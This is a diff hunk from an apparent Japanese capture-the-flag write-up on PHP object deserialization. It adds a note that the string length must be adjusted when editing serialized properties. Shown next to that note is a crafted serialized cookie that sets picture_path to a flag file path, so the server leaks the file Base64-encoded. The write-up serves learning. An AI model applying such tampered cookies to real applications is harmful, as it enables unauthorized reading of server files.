@@ -182,6 +182,8 @@ O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:8:"username";s:7:"tsubasa";s:12:"
 
 この `s:27:"images/real_programmers.png"` が前述の `$picture_path` の値に該当する箇所である。これを FLAG のパスに置き換えて Cookie にセットした上でアクセスすると、本来は画像が表示される箇所に Base64 エンコードされた FLAG が格納されていることが確認できる。
 
+なお、シリアライズされたプロパティを編集する際は、文字列長 (`27` の部分) も適宜変更する必要がある。
+
 ```text
 O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:8:"username";s:7:"tsubasa";s:12:"picture_path";s:46:"/02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt";}s:5:"posts";a:0:{}}
 ```
